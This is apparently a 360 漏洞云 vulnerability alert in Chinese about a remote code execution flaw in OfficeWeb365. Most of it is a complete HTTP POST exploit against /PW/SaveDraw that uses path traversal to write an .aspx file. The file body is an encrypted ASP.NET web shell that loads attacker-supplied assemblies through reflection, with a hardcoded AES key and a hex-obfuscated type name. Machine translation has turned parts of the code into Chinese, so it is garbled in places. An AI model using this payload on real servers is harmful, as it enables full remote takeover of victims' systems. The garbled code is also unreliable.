【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。

360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-00002453

\# 详细

```
POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1
主持人：xxx
用户代理：Mozilla/5.0（Macintosh；Intel Mac OS X 10_15_7）AppleWebKit/537.36（KHTML，如 Gecko）Chrome/88.0.434.18 Safari/537.36
内容长度：2265
内容类型：application/x-www-form-urlencoded
接受编码：gzip、deflate
连接：关闭
数据:image/png;base64,01s34567890123456789y12345678901234567m91<%@ 页面语言="C#" %>
    <%@Import 命名空间="System.Reflection" %>
    <脚本运行=“服务器”>
               私有字节[]解密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            数据 = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
        }
        私有字节[]加密（字节[]数据）
        {
            字符串键=“e45e329feb5d925b”；
            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
            aes.Mode = System.Security.Cryptography.CipherMode.ECB;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            返回 System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
        }
    </脚本>
        <%
        //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance("U").Equals(this);
                byte[] c=Request.BinaryRead(Request.ContentLength);
          string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f, 0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
          类型程序集=Type.GetType(asname);
           MethodInfo load = assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});
           对象 obj=load.Invoke(null, new object[]{Decrypt(c)});
           MethodInfo create = assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});
           字符串名称 = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
           object pay=create.Invoke(obj,new object[] { name });
           pay.Equals(this);%>>---
```

